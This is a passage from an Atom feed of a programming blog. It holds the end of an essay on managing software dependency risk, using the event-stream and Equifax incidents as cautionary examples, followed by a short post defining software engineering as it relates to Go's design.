thread pools for&#xA;“simple” and “complicated” regular expression searches.&#xA;One of the first tests we ran was a benchmark,&#xA;comparing &lt;code&gt;pcregrep&lt;/code&gt; with a few other &lt;code&gt;grep&lt;/code&gt; implementations.&#xA;When we found that, for one basic test case,&#xA;&lt;code&gt;pcregrep&lt;/code&gt; was 70X slower than the&#xA;fastest &lt;code&gt;grep&lt;/code&gt; available,&#xA;we started to rethink our plan to use PCRE.&#xA;Even though we eventually dropped PCRE entirely,&#xA;that benchmark remains in our code base today.&#xA;&lt;a class=anchor href=&#34;#abstract_the_dependency&#34;&gt;&lt;h2 id=&#34;abstract_the_dependency&#34;&gt;Abstract the dependency&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Depending on a package is a decision that you are likely to&#xA;revisit later.&#xA;Perhaps updates will take the package in a new direction.&#xA;Perhaps serious security problems will be found.&#xA;Perhaps a better option will come along.&#xA;For all these reasons, it is worth the effort&#xA;to make it easy to migrate your project to a new dependency.&#xA;&#xA;&lt;p&gt;&#xA;If the package will be used from many places in your project’s source code,&#xA;migrating to a new dependency would require making&#xA;changes to all those different source locations.&#xA;Worse, if the package will be exposed in your own project’s API,&#xA;migrating to a new dependency would require making&#xA;changes in all the code calling your API,&#xA;which you might not control.&#xA;To avoid these costs, it makes sense to&#xA;define an interface of your own,&#xA;along with a thin wrapper implementing that&#xA;interface using the dependency.&#xA;Note that the wrapper should include only&#xA;what your project needs from the dependency,&#xA;not everything the dependency offers.&#xA;Ideally, that allows you to&#xA;substitute a different, equally appropriate dependency later,&#xA;by changing only the wrapper.&#xA;Migrating your per-project tests to use the new interface&#xA;tests the interface and wrapper implementation&#xA;and also makes it easy to test any potential replacements&#xA;for the dependency.&#xA;&#xA;&lt;p&gt;&#xA;For Code Search, we developed an abstract &lt;code&gt;Regexp&lt;/code&gt; class&#xA;that defined the interface Code Search needed from any&#xA;regular expression engine.&#xA;Then we wrote a thin wrapper around PCRE&#xA;implementing that interface.&#xA;The indirection made it easy to test alternate libraries,&#xA;and it kept us from accidentally introducing knowledge&#xA;of PCRE internals into the rest of the source tree.&#xA;That in turn ensured that it would be easy to switch&#xA;to a different dependency if needed.&#xA;&lt;a class=anchor href=&#34;#isolate_the_dependency&#34;&gt;&lt;h2 id=&#34;isolate_the_dependency&#34;&gt;Isolate the dependency&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;It may also be appropriate to isolate a dependency&#xA;at run-time, to limit the possible damage caused by bugs in it.&#xA;For example, Google Chrome allows users to add dependencies—extension code—to the browser.&#xA;When Chrome launched in 2008, it introduced&#xA;the critical feature (now standard in all browsers)&#xA;of isolating each extension in a sandbox running in a separate&#xA;operating-system process.&lt;a class=footnote id=body15 href=&#34;#note15&#34;&gt;&lt;sup&gt;15&lt;/sup&gt;&lt;/a&gt;&#xA;An exploitable bug in an badly-written extension&#xA;therefore did not automatically have access to the entire memory&#xA;of the browser itself&#xA;and could be stopped from making inappropriate system calls.&lt;a class=footnote id=body16 href=&#34;#note16&#34;&gt;&lt;sup&gt;16&lt;/sup&gt;&lt;/a&gt;&#xA;For Code Search, until we dropped PCRE entirely,&#xA;our plan was to isolate at least the PCRE parser&#xA;in a similar sandbox.&#xA;Today,&#xA;another option would be a lightweight hypervisor-based sandbox&#xA;like gVisor.&lt;a class=footnote id=body17 href=&#34;#note17&#34;&gt;&lt;sup&gt;17&lt;/sup&gt;&lt;/a&gt;&#xA;Isolating dependencies&#xA;reduces the associated risks of running that code.&#xA;&#xA;&lt;p&gt;&#xA;Even with these examples and other off-the-shelf options,&#xA;run-time isolation of suspect code is still too difficult and rarely done.&#xA;True isolation would require a completely memory-safe language,&#xA;with no escape hatch into untyped code.&#xA;That’s challenging not just in entirely unsafe languages like C and C++&#xA;but also in languages that provide restricted unsafe operations,&#xA;like Java when including JNI, or like Go, Rust, and Swift&#xA;when including their “unsafe” features.&#xA;Even in a memory-safe language like JavaScript,&#xA;code often has access to far more than it needs.&#xA;In November 2018, the latest version of the NPM package &lt;code&gt;event-stream&lt;/code&gt;,&#xA;which provided a functional streaming API for JavaScript events,&#xA;was discovered to contain obfuscated malicious code that had been&#xA;added two and a half months earlier.&#xA;The code, which harvested large Bitcoin wallets from users of the Copay mobile app,&#xA;was accessing system resources entirely unrelated to processing&#xA;event streams.&lt;a class=footnote id=body18 href=&#34;#note18&#34;&gt;&lt;sup&gt;18&lt;/sup&gt;&lt;/a&gt;&#xA;One of many possible defenses to this kind of problem&#xA;would be to better restrict what dependencies can access.&#xA;&lt;a class=anchor href=&#34;#avoid_the_dependency&#34;&gt;&lt;h2 id=&#34;avoid_the_dependency&#34;&gt;Avoid the dependency&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;If a dependency seems too risky and you can’t find&#xA;a way to isolate it, the best answer may be to avoid it entirely,&#xA;or at least to avoid the parts you’ve identified as most problematic.&#xA;&#xA;&lt;p&gt;&#xA;For example, as we better understood the risks and costs associated&#xA;with PCRE, our plan for Google Code Search evolved&#xA;from “use PCRE directly,” to “use PCRE but sandbox the parser,”&#xA;to “write a new regular expression parser but keep the PCRE execution engine,”&#xA;to “write a new parser and connect it to a different, more efficient open-source execution engine.”&#xA;Later we rewrote the execution engine as well,&#xA;so that no dependencies were left,&#xA;and we open-sourced the result: RE2.&lt;a class=footnote id=body19 href=&#34;#note19&#34;&gt;&lt;sup&gt;19&lt;/sup&gt;&lt;/a&gt;&#xA;&#xA;&lt;p&gt;&#xA;If you only need a&#xA;tiny fraction of a dependency,&#xA;it may be simplest to make a copy of what you need&#xA;(preserving appropriate copyright and other legal notices, of course).&#xA;You are taking on responsibility for fixing bugs, maintenance, and so on,&#xA;but you’re also completely isolated from the larger risks.&#xA;The Go developer community has a proverb about this:&#xA;“A little copying is better than a little dependency.”&lt;a class=footnote id=body20 href=&#34;#note20&#34;&gt;&lt;sup&gt;20&lt;/sup&gt;&lt;/a&gt;&#xA;&lt;a class=anchor href=&#34;#upgrade_the_dependency&#34;&gt;&lt;h2 id=&#34;upgrade_the_dependency&#34;&gt;Upgrade the dependency&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;For a long time, the conventional wisdom about software was “if it ain’t broke, don’t fix it.”&#xA;Upgrading carries a chance of introducing new bugs;&#xA;without a corresponding reward—like a new feature you need—why take the risk?&#xA;This analysis ignores two costs.&#xA;The first is the cost of the eventual upgrade.&#xA;In software, the difficulty of making code changes does not scale linearly:&#xA;making ten small changes is less work and easier to get right&#xA;than making one equivalent large change.&#xA;The second is the cost of discovering already-fixed bugs the hard way.&#xA;Especially in a security context, where known bugs are actively exploited,&#xA;every day you wait is another day that attackers can break in.&#xA;&#xA;&lt;p&gt;&#xA;For example, consider the year 2017 at Equifax, as recounted by executives&#xA;in detailed congressional testimony.&lt;a class=footnote id=body21 href=&#34;#note21&#34;&gt;&lt;sup&gt;21&lt;/sup&gt;&lt;/a&gt;&#xA;On March 7, a new vulnerability in Apache Struts was disclosed, and a patched version was released.&#xA;On March 8, Equifax received a notice from US-CERT about the need to update&#xA;any uses of Apache Struts.&#xA;Equifax ran source code and network scans on March 9 and March 15, respectively;&#xA;neither scan turned up a particular group of public-facing web servers.&#xA;On May 13, attackers found the servers that Equifax’s security teams could not.&#xA;They used the Apache Struts vulnerability to breach Equifax’s network&#xA;and then steal detailed personal and financial information&#xA;about 148 million people&#xA;over the next two months.&#xA;Equifax finally noticed the breach on July 29&#xA;and publicly disclosed it on September 4.&#xA;By the end of September, Equifax’s CEO, CIO, and CSO had all resigned,&#xA;and a congressional investigation was underway.&#xA;&#xA;&lt;p&gt;&#xA;Equifax’s experience drives home the point that&#xA;although dependency managers know the versions they are using at build time,&#xA;you need other arrangements to track that information&#xA;through your production deployment process.&#xA;For the Go language, we are experimenting with automatically&#xA;including a version manifest in every binary, so that deployment&#xA;processes can scan binaries for dependencies that need upgrading.&#xA;Go also makes that information available at run-time, so that&#xA;servers can consult databases of known bugs and self-report to&#xA;monitoring software when they are in need of upgrades.&#xA;&#xA;&lt;p&gt;&#xA;Upgrading promptly is important, but upgrading means&#xA;adding new code to your project,&#xA;which should mean updating your evaluation of the risks&#xA;of using the dependency based on the new version.&#xA;As minimum, you’d want to skim the diffs showing the&#xA;changes being made from the current version to the&#xA;upgraded versions,&#xA;or at least read the release notes,&#xA;to identify the most likely areas of concern in the upgraded code.&#xA;If a lot of code is changing, so that the diffs are difficult to digest,&#xA;that is also information you can incorporate into your&#xA;risk assessment update.&#xA;&#xA;&lt;p&gt;&#xA;You’ll also want to re-run the tests you’ve written&#xA;that are specific to your project,&#xA;to make sure the upgraded package is at least as suitable&#xA;for the project as the earlier version.&#xA;It also makes sense to re-run the package’s own tests.&#xA;If the package has its own dependencies,&#xA;it is entirely possible that your project’s configuration&#xA;uses different versions of those dependencies&#xA;(either older or newer ones) than the package’s authors use.&#xA;Running the package’s own tests can quickly identify problems&#xA;specific to your configuration.&#xA;&#xA;&lt;p&gt;&#xA;Again, upgrades should not be completely automatic.&#xA;You need to verify that the upgraded versions are appropriate for&#xA;your environment before deploying them.&lt;a class=footnote id=body22 href=&#34;#note22&#34;&gt;&lt;sup&gt;22&lt;/sup&gt;&lt;/a&gt;&#xA;&#xA;&lt;p&gt;&#xA;If your upgrade process includes re-running the&#xA;integration and qualification tests you’ve already written for the dependency,&#xA;so that you are likely to identify new problems before they reach production,&#xA;then, in most cases, delaying an upgrade is riskier than upgrading quickly.&#xA;&#xA;&lt;p&gt;&#xA;The window for security-critical upgrades is especially short.&#xA;In the aftermath of the Equifax breach, forensic security teams found&#xA;evidence that attackers (perhaps different ones)&#xA;had successfully exploited the Apache Struts&#xA;vulnerability on the affected servers on March 10, only three days&#xA;after it was publicly disclosed, but they’d only run a single &lt;code&gt;whoami&lt;/code&gt; command.&#xA;&lt;a class=anchor href=&#34;#watch_your_dependencies&#34;&gt;&lt;h2 id=&#34;watch_your_dependencies&#34;&gt;Watch your dependencies&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Even after all that work, you’re not done tending your dependencies.&#xA;It’s important to continue to monitor them and perhaps even&#xA;re-evaluate your decision to use them.&#xA;&#xA;&lt;p&gt;&#xA;First, make sure that you keep using the&#xA;specific package versions you think you are.&#xA;Most dependency managers now make it easy or even automatic&#xA;to record the cryptographic hash of the expected source code&#xA;for a given package version&#xA;and then to check that hash when re-downloading the package&#xA;on another computer or in a test environment.&#xA;This ensures that your build use&#xA;the same dependency source code you inspected and tested.&#xA;These kinds of checks&#xA;prevented the &lt;code&gt;event-stream&lt;/code&gt; attacker,&#xA;described earlier, from silently inserting&#xA;malicious code in the already-released version 3.3.5.&#xA;Instead, the attacker had to create a new version, 3.3.6,&#xA;and wait for people to upgrade (without looking closely at the changes).&#xA;&#xA;&lt;p&gt;&#xA;It is also important to watch for new indirect dependencies creeping in:&#xA;upgrades can easily introduce new packages&#xA;upon which the success of your project now depends.&#xA;They deserve your attention as well.&#xA;In the case of &lt;code&gt;event-stream&lt;/code&gt;, the malicious code was&#xA;hidden in a different package, &lt;code&gt;flatmap-stream&lt;/code&gt;,&#xA;which the new &lt;code&gt;event-stream&lt;/code&gt; release added as a&#xA;new dependency.&#xA;&#xA;&lt;p&gt;&#xA;Creeping dependencies can also affect the size of your project.&#xA;During the development of Google’s Sawzall&lt;a class=footnote id=body23 href=&#34;#note23&#34;&gt;&lt;sup&gt;23&lt;/sup&gt;&lt;/a&gt;—a JIT’ed&#xA;logs processing language—the authors discovered at various times that&#xA;the main interpreter binary contained not just Sawzall’s JIT&#xA;but also (unused) PostScript, Python, and JavaScript interpreters.&#xA;Each time, the culprit turned out to be unused dependencies&#xA;declared by some library Sawzall did depend on,&#xA;combined with the fact that Google’s build system&#xA;eliminated any manual effort needed to start using a new dependency..&#xA;This kind of error is the reason that the Go language&#xA;makes importing an unused package a compile-time error.&#xA;&#xA;&lt;p&gt;&#xA;Upgrading is a natural time to revisit the decision to use a dependency that’s changing.&#xA;It’s also important to periodically revisit any dependency that &lt;i&gt;isn’t&lt;/i&gt; changing.&#xA;Does it seem plausible that there are no security problems or other bugs to fix?&#xA;Has the project been abandoned?&#xA;Maybe it’s time to start planning to replace that dependency.&#xA;&#xA;&lt;p&gt;&#xA;It’s also important to recheck the security history of each dependency.&#xA;For example, Apache Struts disclosed different major remote code execution&#xA;vulnerabilities in 2016, 2017, and 2018.&#xA;Even if you have a list of all the servers that run it and&#xA;update them promptly, that track record might make you rethink using it at all.&#xA;&lt;a class=anchor href=&#34;#conclusion&#34;&gt;&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Software reuse is finally here,&#xA;and I don’t mean to understate its benefits:&#xA;it has brought an enormously positive transformation&#xA;for software developers.&#xA;Even so, we’ve accepted this transformation without&#xA;completely thinking through the potential consequences.&#xA;The old reasons for trusting dependencies are becoming less valid&#xA;at exactly the same time we have more dependencies than ever.&#xA;&#xA;&lt;p&gt;&#xA;The kind of critical examination of specific dependencies that&#xA;I outlined in this article is a significant amount of work&#xA;and remains the exception rather than the rule.&#xA;But I doubt there are any developers who actually&#xA;make the effort to do this for every possible new dependency.&#xA;I have only done a subset of them for a subset of my own dependencies.&#xA;Most of the time the entirety of the decision is “let’s see what happens.”&#xA;Too often, anything more than that seems like too much effort.&#xA;&#xA;&lt;p&gt;&#xA;But the Copay and Equifax attacks are clear warnings of&#xA;real problems in the way we consume software dependencies today.&#xA;We should not ignore the warnings.&#xA;I offer three broad recommendations.&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&lt;i&gt;Recognize the problem.&lt;/i&gt;&#xA;If nothing else, I hope this article has convinced&#xA;you that there is a problem here worth addressing.&#xA;We need many people to focus significant effort on solving it.&#xA;&lt;li&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&lt;i&gt;Establish best practices for today.&lt;/i&gt;&#xA;We need to establish best practices for managing dependencies&#xA;using what’s available today.&#xA;This means working out processes that evaluate, reduce, and track risk,&#xA;from the original adoption decision through to production use.&#xA;In fact, just as some engineers specialize in testing,&#xA;it may be that we need engineers who specialize in managing dependencies.&#xA;&lt;li&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&lt;i&gt;Develop better dependency technology for tomorrow.&lt;/i&gt;&#xA;Dependency managers have essentially eliminated the cost of&#xA;downloading and installing a dependency.&#xA;Future development effort should focus on reducing the cost of&#xA;the kind of evaluation and maintenance necessary to use&#xA;a dependency.&#xA;For example, package discovery sites might work to find&#xA;more ways to allow developers to share their findings.&#xA;Build tools should, at the least, make it easy to run a package’s own tests.&#xA;More aggressively,&#xA;build tools and package management systems could also work together&#xA;to allow package authors to test new changes against all public clients&#xA;of their APIs.&#xA;Languages should also provide easy ways to isolate a suspect package.&lt;/ol&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;There’s a lot of good software out there.&#xA;Let’s work together to find out how to reuse it safely.&#xA;&#xA;&lt;p&gt;&#xA;&lt;a class=anchor href=&#34;#references&#34;&gt;&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;&lt;/a&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;a name=note1&gt;&lt;/a&gt;&#xA;Rachel Potvin and Josh Levenberg, “Why Google Stores Billions of Lines of Code in a Single Repository,” &lt;i&gt;Communications of the ACM&lt;/i&gt; 59(7) (July 2016), pp. 78-87. &lt;a href=&#34;https://doi.org/10.1145/2854146&#34;&gt;https://doi.org/10.1145/2854146&lt;/a&gt; &lt;a class=back href=&#34;#body1&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note2&gt;&lt;/a&gt;&#xA;Russ Cox, “Go &amp;amp; Versioning,” February 2018. &lt;a href=&#34;https://research.swtch.com/vgo&#34;&gt;https://research.swtch.com/vgo&lt;/a&gt; &lt;a class=back href=&#34;#body2&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note3&gt;&lt;/a&gt;&#xA;Ken Thompson, “Reflections on Trusting Trust,” &lt;i&gt;Communications of the ACM&lt;/i&gt; 27(8) (August 1984), pp. 761–763. &lt;a href=&#34;https://doi.org/10.1145/358198.358210&#34;&gt;https://doi.org/10.1145/358198.358210&lt;/a&gt; &lt;a class=back href=&#34;#body3&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note4&gt;&lt;/a&gt;&#xA;GNU Project, “GNU General Public License, version 1,” February 1989. &lt;a href=&#34;https://www.gnu.org/licenses/old-licenses/gpl-1.0.html&#34;&gt;https://www.gnu.org/licenses/old-licenses/gpl-1.0.html&lt;/a&gt; &lt;a class=back href=&#34;#body4&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note5&gt;&lt;/a&gt;&#xA;Titus Winters, “SD-8: Standard Library Compatibility,” C++ Standing Document, August 2018. &lt;a href=&#34;https://isocpp.org/std/standing-documents/sd-8-standard-library-compatibility&#34;&gt;https://isocpp.org/std/standing-documents/sd-8-standard-library-compatibility&lt;/a&gt; &lt;a class=back href=&#34;#body5&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note6&gt;&lt;/a&gt;&#xA;Go Project, “Go 1 and the Future of Go Programs,” September 2013. &lt;a href=&#34;https://golang.org/doc/go1compat&#34;&gt;https://golang.org/doc/go1compat&lt;/a&gt; &lt;a class=back href=&#34;#body6&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note7&gt;&lt;/a&gt;&#xA;Facebook, “Infer: A tool to detect bugs in Java and C/C++/Objective-C code before it ships.” &lt;a href=&#34;https://fbinfer.com/&#34;&gt;https://fbinfer.com/&lt;/a&gt; &lt;a class=back href=&#34;#body7&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note8&gt;&lt;/a&gt;&#xA;“SpotBugs: Find bugs in Java Programs.” &lt;a href=&#34;https://spotbugs.github.io/&#34;&gt;https://spotbugs.github.io/&lt;/a&gt; &lt;a class=back href=&#34;#body8&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note9&gt;&lt;/a&gt;&#xA;D. Richard Hipp, “How SQLite is Tested.” &lt;a href=&#34;https://www.sqlite.org/testing.html&#34;&gt;https://www.sqlite.org/testing.html&lt;/a&gt; &lt;a class=back href=&#34;#body9&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note10&gt;&lt;/a&gt;&#xA;Alexander Potapenko, “Testing Chromium: ThreadSanitizer v2, a next-gen data race detector,” April 2014. &lt;a href=&#34;https://blog.chromium.org/2014/04/testing-chromium-threadsanitizer-v2.html&#34;&gt;https://blog.chromium.org/2014/04/testing-chromium-threadsanitizer-v2.html&lt;/a&gt; &lt;a class=back href=&#34;#body10&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note11&gt;&lt;/a&gt;&#xA;NIST, “National Vulnerability Database – Search and Statistics.” &lt;a href=&#34;https://nvd.nist.gov/vuln/search&#34;&gt;https://nvd.nist.gov/vuln/search&lt;/a&gt; &lt;a class=back href=&#34;#body11&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note12&gt;&lt;/a&gt;&#xA;Russ Cox, “Regular Expression Matching with a Trigram Index, or How Google Code Search Worked,” January 2012. &lt;a href=&#34;https://swtch.com/~rsc/regexp/regexp4.html&#34;&gt;https://swtch.com/~rsc/regexp/regexp4.html&lt;/a&gt; &lt;a class=back href=&#34;#body12&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note13&gt;&lt;/a&gt;&#xA;Google, “Google Open Source: Using Third-Party Licenses.” &lt;a href=&#34;https://opensource.google.com/docs/thirdparty/licenses/#banned&#34;&gt;https://opensource.google.com/docs/thirdparty/licenses/#banned&lt;/a&gt; &lt;a class=back href=&#34;#body13&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note14&gt;&lt;/a&gt;&#xA;Nathan Willis, “A single Node of failure,” LWN, March 2016. &lt;a href=&#34;https://lwn.net/Articles/681410/&#34;&gt;https://lwn.net/Articles/681410/&lt;/a&gt; &lt;a class=back href=&#34;#body14&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note15&gt;&lt;/a&gt;&#xA;Charlie Reis, “Multi-process Architecture,” September 2008. &lt;a href=&#34;https://blog.chromium.org/2008/09/multi-process-architecture.html&#34;&gt;https://blog.chromium.org/2008/09/multi-process-architecture.html&lt;/a&gt; &lt;a class=back href=&#34;#body15&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note16&gt;&lt;/a&gt;&#xA;Adam Langley, “Chromium’s seccomp Sandbox,” August 2009. &lt;a href=&#34;https://www.imperialviolet.org/2009/08/26/seccomp.html&#34;&gt;https://www.imperialviolet.org/2009/08/26/seccomp.html&lt;/a&gt; &lt;a class=back href=&#34;#body16&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note17&gt;&lt;/a&gt;&#xA;Nicolas Lacasse, “Open-sourcing gVisor, a sandboxed container runtime,” May 2018. &lt;a href=&#34;https://cloud.google.com/blog/products/gcp/open-sourcing-gvisor-a-sandboxed-container-runtime&#34;&gt;https://cloud.google.com/blog/products/gcp/open-sourcing-gvisor-a-sandboxed-container-runtime&lt;/a&gt; &lt;a class=back href=&#34;#body17&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note18&gt;&lt;/a&gt;&#xA;Adam Baldwin, “Details about the event-stream incident,” November 2018. &lt;a href=&#34;https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident&#34;&gt;https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident&lt;/a&gt; &lt;a class=back href=&#34;#body18&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note19&gt;&lt;/a&gt;&#xA;Russ Cox, “RE2: a principled approach to regular expression matching,” March 2010. &lt;a href=&#34;https://opensource.googleblog.com/2010/03/re2-principled-approach-to-regular.html&#34;&gt;https://opensource.googleblog.com/2010/03/re2-principled-approach-to-regular.html&lt;/a&gt; &lt;a class=back href=&#34;#body19&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note20&gt;&lt;/a&gt;&#xA;Rob Pike, “Go Proverbs,” November 2015. &lt;a href=&#34;https://go-proverbs.github.io/&#34;&gt;https://go-proverbs.github.io/&lt;/a&gt; &lt;a class=back href=&#34;#body20&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note21&gt;&lt;/a&gt;&#xA;U.S. House of Representatives Committee on Oversight and Government Reform, “The Equifax Data Breach,” Majority Staff Report, 115th Congress, December 2018. &lt;a href=&#34;https://republicans-oversight.house.gov/wp-content/uploads/2018/12/Equifax-Report.pdf&#34;&gt;https://republicans-oversight.house.gov/wp-content/uploads/2018/12/Equifax-Report.pdf&lt;/a&gt; &lt;a class=back href=&#34;#body21&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note22&gt;&lt;/a&gt;&#xA;Russ Cox, “The Principles of Versioning in Go,” GopherCon Singapore, May 2018. &lt;a href=&#34;https://www.youtube.com/watch?v=F8nrpe0XWRg&#34;&gt;https://www.youtube.com/watch?v=F8nrpe0XWRg&lt;/a&gt; &lt;a class=back href=&#34;#body22&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;li&gt;&lt;a name=note23&gt;&lt;/a&gt;&#xA;Rob Pike, Sean Dorward, Robert Griesemer, and Sean Quinlan, “Interpreting the Data: Parallel Analysis with Sawzall,” &lt;i&gt;Scientific Programming Journal&lt;/i&gt;, vol. 13 (2005). &lt;a href=&#34;https://doi.org/10.1155/2005/962135&#34;&gt;https://doi.org/10.1155/2005/962135&lt;/a&gt; &lt;a class=back href=&#34;#body23&#34;&gt;(⇡)&lt;/a&gt;&#xA;&lt;/ol&gt;&#xA;&lt;a class=anchor href=&#34;#coda&#34;&gt;&lt;h2 id=&#34;coda&#34;&gt;Coda&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;A version of this post was published&#xA;in &lt;a href=&#34;https://queue.acm.org/detail.cfm?id=3344149&#34;&gt;ACM Queue&lt;/a&gt;&#xA;(March-April 2019) and then &lt;a href=&#34;https://dl.acm.org/doi/pdf/10.1145/3347446&#34;&gt;Communications of the ACM&lt;/a&gt;&#xA;(August 2019) under the title “Surviving Software Dependencies.”&#xA;</content>
  </entry>
  <entry>
    <title>What is Software Engineering?</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/vgo-eng</id>
    <link rel="alternate" href="http://research.swtch.com/vgo-eng"></link>
    <published>2018-05-30T10:00:00-04:00</published>
    <updated>2018-05-30T10:02:00-04:00</updated>
    <summary type="text">What is software engineering and what does Go mean by it? (Go &amp; Versioning, Part 9)</summary>
    <content type="html">&#xA;&#xA;&lt;p&gt;&#xA;Nearly all of Go’s distinctive design decisions&#xA;were aimed at making software engineering simpler and easier.&#xA;We’ve said this often.&#xA;The canonical reference is Rob Pike’s 2012 article,&#xA;“&lt;a href=&#34;https://talks.golang.org/2012/splash.article&#34;&gt;Go at Google: Language Design in the Service of Software Engineering&lt;/a&gt;.”&#xA;But what is software engineering?&lt;blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;&lt;i&gt;Software engineering is what happens to programming&#xA;&lt;br&gt;&#xA;when you add time and other programmers.&lt;/i&gt;&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;Programming means getting a program working.&#xA;You have a problem to solve, you write some Go code,&#xA;you run it, you get your answer, you’re done.&#xA;That’s programming,&#xA;and that’s difficult enough by itself.&#xA;But what if that code has to keep working, day after day?&#xA;What if five other programmers need to work on the code too?&#xA;Then you start to think about version control systems,&#xA;to track how the code changes over time&#xA;and to coordinate with the other programmers.&#xA;You add unit tests,&#xA;to make sure bugs you fix are not reintroduced over time,&#xA;not by you six months from now,&#xA;and not by that new team member who’s unfamiliar with the code.&#xA;You think about modularity and design patterns,&#xA;to divide the program into parts that team members&#xA;can work on mostly independently.&#xA;You use tools to help you find bugs earlier.&#xA;You look for ways to make programs as clear as possible,&#xA;so that bugs are less likely.&#xA;You make sure that small changes can be tested quickly,&#xA;even in large programs.&#xA;You’re doing all of this because your programming&#xA;has turned into software engineering.&#xA;&#xA;&lt;p&gt;&#xA;(This definition and explanation of software engineering&#xA;is my riff on an original theme by my Google colleague Titus Winters,&#xA;whose preferred phrasing is “software engineering is programming integrated over time.”&#xA;It’s worth seven minutes of your time to see&#xA;&lt;a href=&#34;https://www.youtube.com/watch?v=tISy7EJQPzI&amp;t=8m17s&#34;&gt;his presentation of this idea at CppCon 2017&lt;/a&gt;,&#xA;from 8:17 to 15:00 in the video.)&#xA;&#xA;&lt;p&gt;&#xA;As I said earlier,&#xA;nearly all of Go’s distinctive design decisions&#xA;have been motivated by concerns about software engineering,&#xA;by trying to accommodate time and other programmers&#xA;into the daily practice of programming.&#xA;&#xA;&lt;p&gt;&#xA;For example, most people think that we format Go code with &lt;code&gt;gofmt&lt;/code&gt;&#xA;to make code look nicer or to end debates among&#xA;team members about program layout.&#xA;But the &lt;a href=&#34;https://groups.google.com/forum/#!msg/golang-nuts/HC2sDhrZW5Y/7iuKxdbLExkJ&#34;&gt;most important reason for &lt;code&gt;gofmt&lt;/code&gt;&lt;/a&gt;&#xA;is that if an algorithm defines how Go source code is formatted,&#xA;then programs, like &lt;code&gt;goimports&lt;/code&gt; or &lt;code&gt;gorename&lt;/code&gt; or &lt;code&gt;go&lt;/code&gt; &lt;code&gt;fix&lt;/code&gt;,&#xA;can edit the source code more easily,&#xA;without introducing spurious formatting changes when writing the code back.&#xA;This helps you maintain code over time.&#xA;&#xA;&lt;p&gt;&#xA;As another example, Go import paths are URLs.&#xA;If code said &lt;code&gt;import&lt;/code&gt; &lt;code&gt;&#34;uuid&#34;&lt;/code&gt;,&#xA;you’d have to ask which &lt;code&gt;uuid&lt;/code&gt; package.&#xA;Searching for &lt;code&gt;uuid&lt;/code&gt; on &lt;a href=&#34;https://godoc.org&#34;&gt;godoc.org&lt;/a&gt; turns up dozens of packages.&#xA;If instead the code says &lt;code&gt;import&lt;/code&gt; &lt;code&gt;&#34;github.com/pborman/uuid&#34;&lt;/code&gt;,&#xA;now it’s clear which package we mean.&#xA;Using URLs avoids ambiguity&#xA;and also reuses an existing mechanism for giving out names,&#xA;making it simpler and easier to coordinate with other programmers.&#xA;&#xA;&lt;p&gt;&#xA;Continuing the example,&#xA;Go import paths are written in Go source files,&#xA;not in a separate build configuration file.&#xA;This makes Go source files self-contained,&#xA;which makes it easier to understand, modify, and copy them.&#xA;These decisions, and more, were all made with the goal of&#xA;simplifying software engineering.&#xA;&#xA;&lt;p&gt;&#xA;In later posts I will talk specifically about why&#xA;versions are important for software engineering&#xA;and how software engineering concerns motivate&#xA;the design changes from dep to vgo.&#xA;</content>
  </entry>
  <entry>
    <title>Go and Dogma</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/dogma</id>
    <link rel="alternate" href="http://research.swtch.com/dogma"></link>
    <published>2017-01-09T09:00:00-05:00</published>
    <updated>2017-01-09T09:02:00-05:00</updated>
    <summary type="text">Programming language dogmatics.</summary>
